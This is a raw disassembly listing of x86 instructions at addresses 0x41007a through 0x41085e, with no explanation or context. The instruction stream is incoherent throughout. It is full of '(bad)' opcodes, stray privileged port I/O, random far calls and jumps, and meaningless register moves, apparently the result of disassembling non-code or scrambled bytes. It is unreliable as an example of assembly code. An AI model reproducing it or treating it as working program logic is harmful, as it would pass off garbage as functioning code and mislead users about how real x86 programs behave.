  41007a:	cmp    DWORD PTR [ebp+0x71cb3462],eax
  410080:	dec    ebp
  410081:	or     edi,DWORD PTR [edi]
  410083:	mov    ah,0x1d
  410085:	out    0x16,al
  410087:	dec    eax
  410088:	mov    ah,0x9e
  41008a:	cmp    BYTE PTR [edx],dl
  41008c:	inc    eax
  41008d:	cmp    eax,0x9c7fdade
  410092:	dec    eax
  410093:	fcomip st,st(3)
  410095:	mov    ebx,0xdd80e39b
  41009a:	shl    BYTE PTR [ebx+edi*8+0x48],cl
  41009e:	add    esp,DWORD PTR [ecx]
  4100a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100a1:	mov    dh,0xda
  4100a3:	adc    BYTE PTR [edx+ecx*1-0x24f5d139],0x61
  4100ab:	mov    ebx,DWORD PTR [edi+0x5df0bcc4]
  4100b1:	stos   BYTE PTR es:[edi],al
  4100b2:	test   BYTE PTR [esi-0x7f9af24c],al
  4100b8:	cli    
  4100b9:	call   0x7d47:0x9cc0f0ba
  4100c0:	sub    eax,0xed553951
  4100c5:	int3   
  4100c6:	mov    DWORD PTR [edi],edi
  4100c8:	dec    eax
  4100c9:	scas   eax,DWORD PTR es:[edi]
  4100ca:	(bad)  
  4100cb:	cmp    DWORD PTR [esi-0x251ac288],edx
  4100d1:	loope  0x4100de
  4100d3:	mov    BYTE PTR [edi+0xd],cl
  4100d6:	jge    0x4100ef
  4100d8:	sti    
  4100d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100da:	cmp    al,bh
  4100dc:	xor    dh,BYTE PTR [edi]
  4100de:	jb     0x4100e2
  4100e0:	dec    eax
  4100e1:	mov    ebx,0xb9e7a3e2
  4100e6:	pop    ebp
  4100e7:	push   es
  4100e8:	xchg   DWORD PTR [eax-0x25],esi
  4100eb:	cmp    ecx,DWORD PTR [ecx]
  4100ed:	inc    ebx
  4100ee:	mov    eax,0xd9611d39
  4100f3:	xchg   ebx,eax
  4100f4:	xchg   esi,eax
  4100f5:	jae    0x41014f
  4100f7:	xor    eax,esi
  4100f9:	or     eax,0x4449b9a9
  4100fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100ff:	or     ch,al
  410101:	jnp    0x4100bf
  410103:	(bad)  
  410104:	mov    esp,0x1e69c141
  410109:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41010b:	(bad)  
  41010c:	call   0xc5a6:0x7115c228
  410113:	jae    0x410110
  410115:	pop    esi
  410116:	(bad)  
  410117:	shl    BYTE PTR [eax],cl
  410119:	or     al,0xfe
  41011b:	mov    edi,DWORD PTR [ecx-0x1362acd6]
  410121:	fild   QWORD PTR [edx+edi*1]
  410124:	retf   
  410125:	xchg   ebp,eax
  410126:	aad    0x15
  410128:	push   0x3f
  41012a:	loop   0x410184
  41012c:	push   0x7f9ad3e2
  410131:	test   BYTE PTR [edx+0x1ec2119e],dh
  410137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410138:	push   esi
  410139:	push   cs
  41013a:	out    0x6,al
  41013c:	jns    0x4100e3
  41013e:	mov    ds,WORD PTR [eax+0x3768f343]
  410144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410145:	ret    0x5623
  410148:	mov    WORD PTR [ebx-0xcb117eb],ss
  41014e:	shr    DWORD PTR [edi],cl
  410150:	cmp    al,BYTE PTR [esi-0x667c08de]
  410156:	xor    eax,0xc9f6b51d
  41015b:	std    
  41015c:	cdq    
  41015d:	jle    0x4101b0
  41015f:	lds    ebp,FWORD PTR [ebx]
  410161:	(bad)  
  410162:	loopne 0x410100
  410164:	mov    ?,ecx
  410166:	xor    ecx,DWORD PTR [ecx+0x4f513e0f]
  41016c:	mov    ecx,0xf64e14ce
  410171:	mov    ds:0x54507215,al
  410176:	mov    ch,0x64
  410178:	jbe    0x41019a
  41017a:	fst    DWORD PTR [edx+edx*2+0x5d]
  41017e:	fcom   DWORD PTR [ecx]
  410180:	popa   
  410181:	loopne 0x410178
  410183:	push   cs
  410184:	mov    al,ds:0x7c5b1b8e
  410189:	jo     0x4101b4
  41018b:	adc    esi,DWORD PTR [ecx+ecx*1+0x484cccf3]
  410192:	or     BYTE PTR [ecx+0x0],dl
  410195:	iret   
  410196:	popf   
  410197:	or     DWORD PTR [edi+0x9],esp
  41019a:	xchg   edx,eax
  41019b:	push   esp
  41019c:	mov    ebx,0x833c2ae9
  4101a1:	stos   BYTE PTR es:[edi],al
  4101a2:	sub    al,0x8a
  4101a4:	mov    al,0xbd
  4101a6:	in     al,0xc2
  4101a8:	adc    ah,bl
  4101aa:	and    al,0x65
  4101ac:	or     DWORD PTR [esi+edi*1+0x33a87cf8],0x7a9a42
  4101b7:	adc    ah,cl
  4101b9:	mov    cl,0xc1
  4101bb:	cmp    esp,edx
  4101bd:	pop    ebx
  4101be:	lock gs jae 0x41023d
  4101c2:	mov    edx,0x493ece12
  4101c7:	adc    eax,0x6f4d3f06
  4101cc:	inc    eax
  4101cd:	push   eax
  4101ce:	sbb    al,ah
  4101d0:	int    0xb0
  4101d2:	das    
  4101d3:	push   ecx
  4101d4:	sbb    BYTE PTR [eax-0x6673c3dc],ch
  4101da:	cvtdq2ps xmm0,XMMWORD PTR [eax*2+0xa84d4b]
  4101e2:	dec    esp
  4101e3:	lock mov BYTE PTR ds:[ebp+0x1d75d8a0],bl
  4101eb:	lods   al,BYTE PTR ds:[esi]
  4101ec:	je     0x4101e1
  4101ee:	inc    eax
  4101ef:	ret    
  4101f0:	int3   
  4101f1:	inc    ecx
  4101f2:	into   
  4101f3:	out    dx,eax
  4101f4:	sbb    BYTE PTR [ecx+0x2780d6ff],bl
  4101fa:	iret   
  4101fb:	xchg   edi,eax
  4101fc:	xor    al,BYTE PTR [ebp+0x34]
  4101ff:	mov    esi,0xb24d032f
  410204:	push   edx
  410205:	mov    gs,WORD PTR [edx+0x5a07b187]
  41020b:	cmc    
  41020c:	sub    eax,0xad4fdc58
  410211:	mov    DWORD PTR [ebx-0x21],eax
  410214:	pushf  
  410215:	sbb    eax,0x768f607e
  41021a:	fwait
  41021b:	dec    esp
  41021c:	mov    dh,0xf1
  41021e:	repnz retf 0xa0cd
  410222:	add    eax,0x5d46969b
  410227:	mov    bl,0x33
  410229:	addr16 mov eax,0xb322323f
  41022f:	jne    0x410204
  410231:	neg    BYTE PTR [ebx]
  410233:	call   0xf22d15b1
  410238:	leave  
  410239:	mov    ebx,ecx
  41023b:	xchg   esi,eax
  41023c:	rol    edx,0x6b
  41023f:	push   es
  410240:	mov    edi,0xf9c25a45
  410245:	add    esi,DWORD PTR [edi-0x6e833c6a]
  41024b:	mov    ah,0x3d
  41024d:	pop    edx
  41024e:	stos   DWORD PTR es:[edi],eax
  41024f:	rcr    BYTE PTR [ecx],0x33
  410252:	dec    eax
  410253:	sub    DWORD PTR [edi-0x4f],ebp
  410256:	ficom  DWORD PTR [ecx+ebx*2+0x7d2be157]
  41025d:	lock shl DWORD PTR [ecx-0x2be225bb],1
  410264:	sbb    eax,DWORD PTR [eax]
  410266:	enter  0xa63e,0x75
  41026a:	dec    ecx
  41026b:	or     DWORD PTR [ebp+0x6fff92b5],eax
  410271:	fs popf 
  410273:	popf   
  410274:	xchg   esi,eax
  410275:	sbb    BYTE PTR [esi],0xe1
  410278:	inc    eax
  410279:	jnp    0x410206
  41027b:	xlat   BYTE PTR ds:[ebx]
  41027c:	mov    dl,BYTE PTR [edi+0x532270a3]
  410282:	cmc    
  410283:	jns    0x410291
  410285:	(bad)  
  410286:	and    bh,BYTE PTR [edi-0x3a382f06]
  41028c:	cdq    
  41028d:	mov    dl,0xfa
  41028f:	rcr    ebp,0x20
  410292:	inc    edx
  410293:	xor    eax,0xf0c391b5
  410298:	mov    BYTE PTR [esi+0x69f6b264],dh
  41029e:	scas   al,BYTE PTR es:[edi]
  41029f:	cdq    
  4102a0:	aas    
  4102a1:	sbb    DWORD PTR [edi-0x7f],ebp
  4102a4:	jno    0x41030c
  4102a6:	xchg   ebx,eax
  4102a7:	or     eax,0x7e564162
  4102ac:	stos   BYTE PTR es:[edi],al
  4102ad:	popa   
  4102ae:	fmul   QWORD PTR [bx+si-0x13]
  4102b2:	pop    ebx
  4102b3:	and    edx,edx
  4102b5:	push   esi
  4102b6:	arpl   WORD PTR [ecx+esi*1+0x47],cx
  4102ba:	jle    0x41027a
  4102bc:	scas   al,BYTE PTR es:[edi]
  4102bd:	popa   
  4102be:	pop    ss
  4102bf:	push   ecx
  4102c0:	pop    ss
  4102c1:	pop    ss
  4102c2:	xor    BYTE PTR [ebp-0x1b],ah
  4102c5:	out    dx,al
  4102c6:	ror    DWORD PTR [ecx],0x4c
  4102c9:	and    al,BYTE PTR [eax]
  4102cb:	mov    DWORD PTR [eax+0x5],esp
  4102ce:	add    ch,BYTE PTR [ebx]
  4102d0:	inc    eax
  4102d1:	mov    esp,DWORD PTR [edi+esi*1+0x4bf3b658]
  4102d8:	(bad)  
  4102d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102da:	shr    DWORD PTR [edi+0x11],cl
  4102dd:	shl    BYTE PTR [edx+0x2],1
  4102e0:	mov    edx,0xed89afab
  4102e5:	outs   dx,DWORD PTR ds:[esi]
  4102e6:	lods   eax,DWORD PTR ds:[esi]
  4102e7:	test   dl,ch
  4102e9:	cmp    BYTE PTR [ebp+0x2ec136fa],bl
  4102ef:	retf   
  4102f0:	cmp    edx,DWORD PTR [eax]
  4102f2:	and    BYTE PTR [eax+eax*4+0x7f],ch
  4102f6:	sti    
  4102f7:	push   cs
  4102f8:	les    ebx,FWORD PTR [ecx+eax*8]
  4102fb:	adc    ch,BYTE PTR [edi-0x7f]
  4102fe:	push   esi
  4102ff:	leave  
  410300:	fwait
  410301:	dec    ecx
  410302:	sub    eax,0x734c098b
  410307:	push   edi
  410308:	sbb    BYTE PTR [eax+0x15],bl
  41030b:	(bad)  
  41030c:	pop    esi
  41030d:	adc    al,0x9a
  41030f:	sbb    ecx,DWORD PTR [ebp+0x6c9dbabc]
  410315:	xor    ebp,eax
  410317:	arpl   WORD PTR [edi+0xf],dx
  41031a:	std    
  41031b:	addr16 add esp,eax
  41031e:	lds    edx,FWORD PTR [edi-0x24]
  410321:	jmp    0x1f65ff08
  410326:	push   0x7f062591
  41032b:	dec    ebx
  41032c:	mov    ss,ecx
  41032e:	es push esp
  410330:	sbb    eax,0x2bda2675
  410335:	add    eax,0x177055d9
  41033a:	aaa    
  41033b:	sub    eax,0xe7f02177
  410340:	inc    eax
  410341:	xlat   BYTE PTR ds:[ebx]
  410342:	jae    0x410393
  410344:	ds mov eax,0x321fd493
  41034a:	dec    ebx
  41034b:	ja     0x4103ac
  41034d:	fldenv [edi+0x48]
  410350:	push   ebp
  410351:	out    dx,al
  410352:	jg     0x41036a
  410354:	ds cmc 
  410356:	loope  0x410391
  410358:	mov    bl,BYTE PTR [edi+0x5c68c537]
  41035e:	retf   
  41035f:	addr16 xor edi,esi
  410362:	fs pop edx
  410364:	xor    al,0xf3
  410366:	push   edi
  410367:	int    0x8a
  410369:	mov    al,bl
  41036b:	jg     0x41039f
  41036d:	dec    ebx
  41036e:	push   ss
  41036f:	push   cs
  410370:	sbb    DWORD PTR [esi+0x7d51fc59],ebp
  410376:	dec    BYTE PTR [ebx]
  410378:	pop    ebp
  410379:	mov    al,0x93
  41037b:	mov    dh,0xb0
  41037d:	pusha  
  41037e:	adc    ebp,ebx
  410380:	pop    ebp
  410381:	and    ebx,0x6d
  410384:	mov    edi,0x1647ee5
  410389:	inc    esi
  41038a:	adc    al,0x7b
  41038c:	jmp    0xa99c:0x91c491aa
  410393:	lds    ebx,FWORD PTR [edx+0x1ec7d8c]
  410399:	inc    ebx
  41039a:	xor    ecx,DWORD PTR ds:0x7fb0d2e6
  4103a0:	clc    
  4103a1:	add    edi,0x938a35ed
  4103a7:	dec    ebx
  4103a8:	sub    DWORD PTR [edi+0xdfe450b],ecx
  4103ae:	lock xlat BYTE PTR ds:[ebx]
  4103b0:	pop    ds
  4103b1:	std    
  4103b2:	pusha  
  4103b3:	or     eax,0x3dd010f9
  4103b8:	xchg   edx,eax
  4103b9:	aaa    
  4103ba:	in     eax,0x5a
  4103bc:	mov    ds:0xe146057,eax
  4103c1:	iret   
  4103c2:	icebp  
  4103c3:	fwait
  4103c4:	push   ebp
  4103c5:	dec    ebp
  4103c6:	stos   BYTE PTR es:[edi],al
  4103c7:	adc    eax,0xdeee8827
  4103cc:	in     al,dx
  4103cd:	inc    ebx
  4103ce:	mov    ebp,0xb796bed2
  4103d3:	test   BYTE PTR [ebx],bl
  4103d5:	mov    DWORD PTR [esi-0x23464a88],edi
  4103db:	xor    bl,al
  4103dd:	dec    ebx
  4103de:	and    DWORD PTR [ebp+0x2f943e4f],0xffffff97
  4103e5:	sbb    eax,0x921a97fe
  4103ea:	js     0x410390
  4103ec:	stos   BYTE PTR es:[edi],al
  4103ed:	jo     0x41044e
  4103ef:	cmp    dl,BYTE PTR [esi+0x3e84e6d6]
  4103f5:	jo     0x4103bc
  4103f7:	inc    esi
  4103f8:	pop    ebx
  4103f9:	adc    eax,0x8aec8fe1
  4103fe:	xchg   edi,eax
  4103ff:	dec    ebp
  410400:	repnz aam 0x16
  410403:	popf   
  410404:	inc    esp
  410405:	fwait
  410406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410407:	js     0x410465
  410409:	ret    
  41040a:	inc    ebx
  41040b:	or     BYTE PTR [ebx-0x1c],bl
  41040e:	dec    ebx
  41040f:	adc    ch,al
  410411:	mov    bl,0xef
  410413:	out    dx,al
  410414:	dec    esp
  410415:	jno    0x410402
  410417:	ins    BYTE PTR es:[edi],dx
  410418:	jp     0x4103d3
  41041a:	adc    eax,0x55524ad4
  41041f:	lods   eax,DWORD PTR ds:[esi]
  410420:	mov    esi,0x86c38da4
  410425:	inc    ebx
  410426:	loopne 0x410457
  410428:	iret   
  410429:	daa    
  41042a:	dec    esp
  41042b:	dec    DWORD PTR [ebx+eax*2]
  41042e:	push   0xed427d61
  410433:	ja     0x41048a
  410435:	adc    eax,0x9446092d
  41043a:	jmp    0x410416
  41043c:	xor    ebx,0xb3693656
  410442:	daa    
  410443:	inc    ebp
  410444:	add    edx,DWORD PTR [ecx-0x71]
  410447:	jo     0x41049e
  410449:	dec    edi
  41044a:	dec    ebx
  41044b:	icebp  
  41044c:	jl     0x4104b7
  41044e:	aaa    
  41044f:	inc    eax
  410450:	outs   dx,DWORD PTR ds:[esi]
  410451:	dec    ecx
  410452:	push   esp
  410453:	pop    edi
  410454:	adc    DWORD PTR [ebx+0x7e],esp
  410457:	aad    0x68
  410459:	xchg   BYTE PTR [ebp+0x79f4dbdd],bh
  41045f:	mov    ebp,0x314be65c
  410464:	daa    
  410465:	mov    al,0xba
  410467:	push   es
  410468:	out    dx,ax
  41046a:	mov    ch,0x52
  41046c:	xor    esi,esp
  41046e:	xchg   ebx,eax
  41046f:	push   ebp
  410470:	mov    ebx,0xd8105bd6
  410475:	push   es
  410476:	and    BYTE PTR [eax+0x65bf35d1],bl
  41047c:	jnp    0x4104e7
  41047e:	repz push eax
  410480:	ror    DWORD PTR [ecx],1
  410482:	and    eax,0xc7d24ba4
  410487:	(bad)  
  410488:	pusha  
  410489:	xor    eax,DWORD PTR [edx+0x77d285c3]
  41048f:	out    dx,eax
  410490:	mov    ebx,0xaca5ff6a
  410495:	es inc ebx
  410497:	xor    dh,al
  410499:	cmp    ebp,ecx
  41049b:	pop    edi
  41049c:	(bad)  
  41049e:	pushf  
  41049f:	outs   dx,BYTE PTR ds:[esi]
  4104a0:	and    BYTE PTR [ebx-0x5c],ch
  4104a3:	mov    DWORD PTR [ecx-0x38],ecx
  4104a6:	fsubrp st(3),st
  4104a8:	mov    dh,0xbc
  4104aa:	cmp    edi,DWORD PTR [edx-0x64f8386c]
  4104b0:	cwde   
  4104b1:	adc    ebx,DWORD PTR [eax+0x28]
  4104b4:	inc    edi
  4104b5:	sbb    dh,BYTE PTR [ecx]
  4104b7:	mov    ebx,0xb1c03050
  4104bc:	push   edi
  4104bd:	in     al,dx
  4104be:	or     DWORD PTR [ecx-0x63ae2e85],edi
  4104c4:	dec    ebx
  4104c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104c6:	out    dx,eax
  4104c7:	stos   DWORD PTR es:[edi],eax
  4104c8:	lock adc BYTE PTR [edi+0xe23954],ah
  4104cf:	and    al,0x3
  4104d1:	pushf  
  4104d2:	addr16 js 0x41048c
  4104d5:	xchg   ecx,eax
  4104d6:	ret    
  4104d7:	out    0xb1,eax
  4104d9:	xchg   edi,eax
  4104da:	retf   
  4104db:	sub    edi,DWORD PTR [ebx]
  4104dd:	not    DWORD PTR [edi]
  4104df:	in     eax,0x17
  4104e1:	ror    DWORD PTR [ebx-0x608bc9ce],0xe6
  4104e8:	add    al,0xaf
  4104ea:	retf   0xf50e
  4104ed:	inc    esp
  4104ee:	and    eax,eax
  4104f0:	or     bl,bl
  4104f2:	bound  edi,QWORD PTR [edx]
  4104f4:	gs sub eax,esi
  4104f7:	push   esi
  4104f8:	pushf  
  4104f9:	call   DWORD PTR [ebp+0x55]
  4104fc:	adc    ebx,0x1b
  4104ff:	add    BYTE PTR [edx],dh
  410501:	cmp    eax,0xc3ddd561
  410506:	dec    DWORD PTR [eax+0x64]
  410509:	xchg   edx,eax
  41050a:	jmp    0x45c074eb
  41050f:	or     dh,BYTE PTR ss:[ebx]
  410512:	out    dx,al
  410513:	aad    0xd2
  410515:	aam    0x14
  410517:	pop    ebp
  410518:	sbb    al,ch
  41051a:	jne    0x410522
  41051c:	dec    edi
  41051d:	ds sahf 
  41051f:	push   eax
  410520:	mov    eax,DWORD PTR [ebp-0x79]
  410523:	push   esi
  410524:	jmp    0x695a:0xc10eeee8
  41052b:	push   ecx
  41052c:	dec    edx
  41052d:	rol    DWORD PTR ds:0xbd4ae959,1
  410533:	xchg   esi,eax
  410534:	icebp  
  410535:	mov    dl,0x2e
  410537:	loopne 0x410555
  410539:	push   edx
  41053a:	dec    edx
  41053b:	test   eax,0x40722822
  410540:	pop    esi
  410541:	jbe    0x410567
  410543:	push   esi
  410544:	mov    al,ds:0x60700673
  410549:	sub    ebx,DWORD PTR [ebx-0x45feef40]
  41054f:	mov    eax,ds:0xb3fd3df6
  410554:	fwait
  410555:	mov    ebp,0x2f86c1f5
  41055a:	xchg   ebp,eax
  41055b:	pop    es
  41055c:	jmp    0x1c71:0x872236d2
  410563:	and    al,0x49
  410565:	lahf   
  410566:	adc    eax,0x452eb5e2
  41056b:	mov    ebx,0x6596dcf3
  410570:	adc    eax,0x2a706f2b
  410575:	in     al,0x4f
  410577:	or     eax,0x41e5f37b
  41057c:	xor    eax,0x9f4615ad
  410581:	dec    ebx
  410582:	xor    edx,DWORD PTR [ebx-0x16]
  410585:	sub    al,0x2e
  410587:	or     DWORD PTR [ebx],ebp
  410589:	retf   
  41058a:	call   0x42a8f547
  41058f:	(bad)
  410593:	xor    al,0x55
  410595:	fnstcw WORD PTR [ecx-0x1a]
  410598:	aam    0x79
  41059a:	leave  
  41059b:	rcl    esi,cl
  41059d:	es xchg ebx,eax
  41059f:	call   0xe36b:0x7d856bf
  4105a6:	mov    ah,0x23
  4105a8:	loop   0x4105de
  4105aa:	jno    0x410592
  4105ac:	data16 mov cl,0xbf
  4105af:	fdivr  DWORD PTR [eax-0x9]
  4105b2:	enter  0xd161,0x4e
  4105b6:	dec    ebx
  4105b7:	sar    BYTE PTR [esi],1
  4105b9:	jecxz  0x4105d8
  4105bb:	addr16 jle 0x410578
  4105be:	int    0x10
  4105c0:	fidiv  DWORD PTR [esi-0x20]
  4105c3:	lods   al,BYTE PTR ds:[esi]
  4105c4:	sub    BYTE PTR [edi-0x3e9dc309],bl
  4105ca:	cmp    al,0x1d
  4105cc:	push   esi
  4105cd:	mov    dl,0x2c
  4105cf:	cdq    
  4105d0:	xchg   esi,eax
  4105d1:	adc    al,0x8c
  4105d3:	pop    esp
  4105d4:	enter  0x963e,0x91
  4105d8:	pop    ds
  4105d9:	inc    ebx
  4105da:	sub    al,0xf8
  4105dc:	or     al,0x14
  4105de:	sub    al,0x2
  4105e0:	fst    QWORD PTR [ebx-0x66]
  4105e3:	(bad)  
  4105e5:	daa    
  4105e6:	lahf   
  4105e7:	mov    edi,0x54162cdc
  4105ec:	jmp    0x41064a
  4105ee:	aad    0xcb
  4105f0:	repz adc dh,ch
  4105f3:	int3   
  4105f4:	mov    bl,0x2e
  4105f6:	jg     0x4105a0
  4105f8:	aas    
  4105f9:	arpl   WORD PTR [edi],di
  4105fb:	lahf   
  4105fc:	pop    esp
  4105fd:	push   es
  4105fe:	pop    ebx
  4105ff:	mov    dl,0xb8
  410601:	test   al,0x30
  410603:	jae    0x41060d
  410605:	inc    ebx
  410606:	mov    eax,ds:0x5f7fea71
  41060b:	mov    eax,ds:0x1e74edd4
  410610:	and    DWORD PTR ss:[eax],edx
  410613:	adc    al,0xd0
  410615:	jns    0x410667
  410617:	xor    BYTE PTR [ebx+0x6be51a61],dl
  41061d:	imul   esi,DWORD PTR [ecx+0x6ee38ba0],0x67170287
  410627:	push   ecx
  410628:	imul   esi,ecx,0x2e
  41062b:	add    ecx,esp
  41062d:	scas   al,BYTE PTR es:[edi]
  41062e:	loopne 0x410623
  410630:	adc    esp,DWORD PTR [ebp-0x43]
  410633:	add    eax,0x6c5688e3
  410638:	xor    eax,0xb60535ff
  41063d:	loop   0x4106ac
  41063f:	xchg   DWORD PTR [eax-0x65],esp
  410642:	mov    bl,0x82
  410644:	leave  
  410645:	push   0xed3c636b
  41064a:	jnp    0x410680
  41064c:	mov    ds:0xb7eecb53,al
  410651:	jp     0x4105da
  410653:	fcomp  QWORD PTR [ebx-0x5b]
  410656:	add    eax,0xaec9f406
  41065b:	(bad)  
  41065c:	test   DWORD PTR ds:[edx-0x1f],esi
  410660:	cmp    eax,DWORD PTR [ebp-0x59]
  410663:	out    dx,al
  410664:	adc    DWORD PTR [edx],eax
  410666:	inc    esi
  410667:	mov    al,ds:0x751f9018
  41066c:	cmp    DWORD PTR [ebx+eiz*8+0x71],esp
  410670:	mov    ds:0x2019cb1c,eax
  410675:	cmc    
  410676:	inc    ebx
  410677:	bound  ecx,QWORD PTR [eax+0x14]
  41067a:	loopne 0x41062c
  41067c:	xchg   ch,ch
  41067e:	xor    bh,BYTE PTR [eax]
  410680:	in     al,0xdd
  410682:	add    al,0xa0
  410684:	pushf  
  410685:	pushf  
  410686:	stos   BYTE PTR es:[edi],al
  410687:	or     eax,0x9bff4218
  41068c:	dec    ecx
  41068d:	pop    ebp
  41068e:	icebp  
  41068f:	mov    edx,0x7635070a
  410694:	(bad)
  410697:	mov    ds:0xb57ea6a0,al
  41069c:	adc    esi,edi
  41069e:	in     al,0x37
  4106a0:	cmp    eax,0x6df656f
  4106a5:	pop    eax
  4106a6:	or     esp,DWORD PTR ds:0xbc4
  4106ab:	xlat   BYTE PTR ds:[ebx]
  4106ac:	jg     0x410646
  4106ae:	push   es
  4106af:	jns    0x410646
  4106b1:	in     al,0x70
  4106b3:	mov    esp,0x7403d481
  4106b8:	out    dx,al
  4106b9:	stc    
  4106ba:	inc    ebp
  4106bb:	int    0xd7
  4106bd:	nop
  4106be:	mov    bh,0xc8
  4106c0:	pop    esi
  4106c1:	push   ecx
  4106c2:	stos   BYTE PTR es:[edi],al
  4106c3:	push   esp
  4106c4:	vmovsd xmm7,QWORD PTR [edx-0x78]
  4106c9:	mov    al,0xd5
  4106cb:	pushf  
  4106cc:	mov    al,0x12
  4106ce:	mov    ebp,0x2db7d02a
  4106d3:	arpl   WORD PTR [eax+esi*4+0xe],di
  4106d7:	push   esp
  4106d8:	and    BYTE PTR [ecx+0x73],dh
  4106db:	clc    
  4106dc:	sbb    DWORD PTR [eax],0x16
  4106df:	ret    0xfeb4
  4106e2:	cmp    ch,BYTE PTR [ecx-0x4]
  4106e5:	xor    eax,0x48e08c51
  4106ea:	int3   
  4106eb:	(bad)  
  4106ed:	push   edx
  4106ee:	cs fs or al,0x6b
  4106f2:	push   ebx
  4106f3:	mov    ch,0x10
  4106f5:	out    0xd7,al
  4106f7:	add    eax,0x7fd4bb45
  4106fc:	add    bl,BYTE PTR [edi+0x6c]
  4106ff:	xor    BYTE PTR ds:[ebx],dl
  410702:	dec    edx
  410703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410704:	jb     0x410763
  410706:	mov    al,ds:0x1191ff8a
  41070b:	add    BYTE PTR ds:0x293f8ba8,cl
  410711:	pop    ebx
  410712:	mov    ds:0xac728991,al
  410717:	inc    esp
  410718:	test   BYTE PTR [ebx+0x5ecb5cb7],cl
  41071e:	fimul  WORD PTR [ebx-0x4e]
  410721:	pop    ds
  410722:	cld    
  410723:	dec    esi
  410724:	ss push ds
  410726:	test   BYTE PTR [esi],bh
  410728:	and    edi,esi
  41072a:	clc    
  41072b:	sub    DWORD PTR [ecx-0x20],ebp
  41072e:	popf   
  41072f:	shl    dh,1
  410731:	shr    BYTE PTR [eax+edi*2],1
  410734:	daa    
  410735:	push   cs
  410736:	jle    0x410750
  410738:	jbe    0x4106d3
  41073a:	mov    ebp,0xb2fd9f35
  41073f:	xlat   BYTE PTR ds:[ebx]
  410740:	mov    bl,0x61
  410742:	out    0xf0,eax
  410744:	xchg   edx,eax
  410745:	pop    edi
  410746:	test   DWORD PTR [edi+0x47],esp
  410749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41074a:	mov    cl,0x9f
  41074c:	xchg   ebx,eax
  41074d:	cdq    
  41074e:	push   cs
  41074f:	pop    edi
  410750:	jg     0x4106eb
  410752:	push   esp
  410753:	or     al,0x80
  410755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410756:	mov    ds:0xfc0bf326,al
  41075b:	mov    ecx,0x89d71780
  410760:	in     eax,0xb2
  410762:	hlt    
  410763:	pop    esp
  410764:	aas    
  410765:	pop    esp
  410766:	sbb    DWORD PTR [edx+0x2e2db462],esi
  41076c:	inc    esp
  41076d:	aaa    
  41076e:	clc    
  41076f:	fwait
  410770:	push   0x1c3fe79d
  410775:	mov    bh,0x63
  410777:	xor    eax,0xed2ac90f
  41077c:	add    al,0x6b
  41077e:	fwait
  41077f:	icebp  
  410780:	lahf   
  410781:	cmp    bh,bh
  410783:	call   0x50d6ed19
  410788:	ror    edi,1
  41078a:	sub    eax,0x5a3a2d9b
  41078f:	xchg   edx,eax
  410790:	pushf  
  410791:	ss xchg edx,eax
  410793:	sbb    esi,eax
  410795:	mov    ebx,0xf58a7e60
  41079a:	jmp    0xf068a371
  41079f:	mov    eax,0xaff312f7
  4107a4:	jno    0x4107dd
  4107a6:	ret    0xe473
  4107a9:	test   BYTE PTR [ecx],0xbf
  4107ac:	enter  0x4ce8,0xe6
  4107b0:	mov    ebp,0xeff6f129
  4107b5:	sub    ebp,DWORD PTR [eax-0x3e]
  4107b8:	pop    es
  4107b9:	(bad)  
  4107bb:	add    al,ch
  4107bd:	shl    DWORD PTR [edi+edx*1-0x21c84c4f],1
  4107c4:	clc    
  4107c5:	mov    dl,0xfc
  4107c7:	inc    edi
  4107c8:	dec    edi
  4107c9:	inc    esi
  4107ca:	jp     0x4107b9
  4107cc:	out    0x25,eax
  4107ce:	push   edi
  4107cf:	fld    QWORD PTR [edx]
  4107d1:	rcr    DWORD PTR [ecx],cl
  4107d3:	adc    al,0xbe
  4107d5:	sub    dl,BYTE PTR [esi-0x21]
  4107d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107d9:	add    DWORD PTR [ecx],edi
  4107db:	jne    0x410783
  4107dd:	sub    al,0x9f
  4107df:	cmp    eax,0x32a75c9b
  4107e4:	leave  
  4107e5:	nop
  4107e6:	(bad)  
  4107e7:	xor    dh,BYTE PTR [esi+0x3fce4cd6]
  4107ed:	pop    esi
  4107ee:	fdivr  DWORD PTR [ebx-0x2236f5c1]
  4107f4:	loope  0x4107d8
  4107f6:	in     eax,0xc5
  4107f8:	loope  0x4107b3
  4107fa:	shl    DWORD PTR [ebx-0x70],cl
  4107fd:	xchg   ebp,edi
  4107ff:	mov    al,0x4e
  410801:	push   ss
  410802:	(bad)  
  410803:	mov    esi,ebx
  410805:	adc    esi,DWORD PTR [edi-0x5e]
  410808:	add    dl,BYTE PTR [ebp-0x5a]
  41080b:	arpl   ax,ax
  41080d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41080e:	xchg   esp,eax
  41080f:	arpl   WORD PTR [edx-0x28],bx
  410812:	xor    DWORD PTR [edx-0x41bec584],ecx
  410818:	fmul   QWORD PTR [edi-0x2fc173f0]
  41081e:	sub    al,BYTE PTR ds:0xa3ce3d03
  410824:	sbb    ecx,edx
  410826:	xchg   esp,eax
  410827:	push   ecx
  410828:	push   esi
  410829:	daa    
  41082a:	mov    dh,0x37
  41082c:	cmp    BYTE PTR [eax],0x54
  41082f:	sbb    ch,BYTE PTR fs:[edi-0x71]
  410833:	jns    0x4107de
  410835:	shrd   DWORD PTR [ecx],edi,0x46
  410839:	aad    0x11
  41083b:	xchg   DWORD PTR [edx],ebp
  41083d:	sub    al,0x95
  41083f:	stos   BYTE PTR es:[edi],al
  410840:	inc    esp
  410841:	and    bh,BYTE PTR [esp+esi*1]
  410844:	mov    bh,dh
  410846:	in     al,dx
  410847:	stos   DWORD PTR es:[edi],eax
  410848:	pop    ss
  410849:	mov    esp,0xd8379a11
  41084e:	cwde   
  41084f:	rol    DWORD PTR [eax+0x1633acf],0x95
  410856:	inc    eax
  410857:	call   0x100d13ca
  41085c:	jno    0x41086f
  41085e:	cmp    al,0xbc
